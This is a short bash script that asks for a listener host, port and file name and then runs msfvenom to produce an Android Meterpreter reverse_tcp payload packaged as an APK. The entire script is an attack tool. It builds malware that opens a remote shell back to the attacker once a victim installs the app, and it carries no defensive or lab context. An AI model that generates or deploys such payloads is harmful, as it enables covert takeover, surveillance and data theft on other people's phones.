#!/bin/bash

read -p "LHOST: " lhost
    echo ""
    echo "[LHOST]=> $lhost"
    echo ""
    read -p "LPORT: " lport
    echo ""
    echo "[LPORT]=> $lport"
    echo ""
    read -p "NAME: " name
    echo ""
    
    echo "Generating Payload..."
    echo ""
    
    msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport -o ${name}.apk
    
    echo ""
    echo "Payload Sucessfully Generated !!!"
    echo ""